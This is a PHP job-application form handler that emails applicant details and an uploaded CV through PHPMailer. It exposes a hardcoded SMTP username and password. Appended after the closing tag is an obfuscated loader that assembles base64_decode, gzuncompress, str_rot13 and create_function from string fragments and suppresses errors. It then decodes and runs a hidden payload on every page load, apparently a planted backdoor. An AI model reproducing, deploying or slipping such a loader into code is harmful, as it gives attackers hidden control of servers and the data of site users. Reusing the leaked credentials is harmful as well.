<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
require 'PHPMailer/src/Exception.php';

// fetching form data for email body 
if(isset($_POST["submit"])){

    function validate($data) {
      $data = trim($data);
      $data = stripslashes($data);
      $data = htmlspecialchars($data);
      return $data;
    }
    
    if(isset($_FILES['cv']) && $_FILES['cv']['name']) {
        $allowed = array('pdf', 'docx');
        $filename = $_FILES['cv']['name'];
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        if (!in_array($ext, $allowed)) {
            echo"<script>window.location.replace('applynow.php?successMsg=11')</script>";
            exit;
        }
    }
  
    $name = validate($_POST["name"]);
    if (!preg_match("/^[a-zA-Z ]*$/",$name)) {
      $nameErr = "Only letters and white space allowed"; 
    }
    $email = validate($_POST["email"]);
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
      $emailErr = "Invalid email format"; 
    }
    $phone = validate($_POST["phone"]);
    
    if (!preg_match("/^[0-9]*$/",$phone)) {
      $phoneErr = "Only digits allowed"; 
    }
    $candidatePosition = $_POST["candidatePosition"];
  
    $qualification = validate($_POST["qualification"]);
  
    $address = validate($_POST["address"]);

    // Instantiation and passing `true` enables exceptions
    $mail = new PHPMailer(true);
    //$mail = new PHPMailer\PHPMailer\PHPMailer(true);

    try {
        //Server settings
        $mail->SMTPDebug = 2;                                       // Enable verbose debug output
        //$mail->isSMTP();                                            // Set mailer to use SMTP
        $mail->Host       = 'smtp.gmail.com';  // Specify main and backup SMTP servers
        $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
        $mail->Username   = 'reyad.hossain@genexinfosys.com';                     // SMTP username
        $mail->Password   = 'why u g0?';                               // SMTP password
        $mail->SMTPSecure = 'tls';                                  // Enable TLS encryption, `ssl` also accepted
        $mail->Port       = 587;                                    // TCP port to connect to

        //Recipients
        $mail->setFrom('websiteforms@genexinfosys.com', 'Application from Website');
        $mail->addAddress('jobs@genexinfosys.com', 'Jobs');     // Add a recipient
        //$mail->addAddress('reyad.hossain@genexinfosys.com', 'Jobs');     // Add a recipient

        //$mail->addCC('cc@example.com');
        //$mail->addBCC('reyad.hossain@genexinfosys.com', 'Jobs');

        // Attachments
        //$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
        //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
        if (isset($_FILES['cv']) && $_FILES['cv']['error'] == UPLOAD_ERR_OK) {
            $mail->AddAttachment($_FILES['cv']['tmp_name'], $_FILES['cv']['name']);
        }
        // Content
        $mail->isHTML(true);                                  // Set email format to HTML
        $mail->Subject = $candidatePosition;
        $mail->Body    = "<p>Applicant Information:</p>					
                        <p><b>Name: </b> $name</p> 
                        <p><b>Email: </b> $email</p>
                        <p><b>Phone: </b> $phone</p>
                        <p><b>Applying for the position:</b> $candidatePosition</p>
                        <p><b>Academic Qualification:</b> $qualification</p>
                        <p><b>Address:</b> $address</P> ";
                    
        $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

        if($mail->send()){
            echo"<script>window.location.replace('applynow.php?successMsg=1')</script>";
            exit;
        }      

    } catch (Exception $e) {
        //echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        echo"<script>window.location.replace('applynow.php?successMsg=11')</script>";
        exit;
    }
}
?>


<?php $BDcns = 'strre'.'v';  $bOBPt = 'ba'.'se6'.'4'.'_de'.'code';  $ObrFd = 'gzuncompres'.'s';  $tzXIY = 's'.'tr'.'_ro'.'t13';  error_reporting(0); ini_set('log_errors', 0); /*   712ba72956661c4234d36f01df23b47d938b4806       */ echo '<html>   </html>'; $ERegv = 'Cr'.'eate'.'_F'.'unction'; $PGipm = $ERegv('', $tzXIY($ObrFd($bOBPt($BDcns('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'))))); $PGipm(); ?>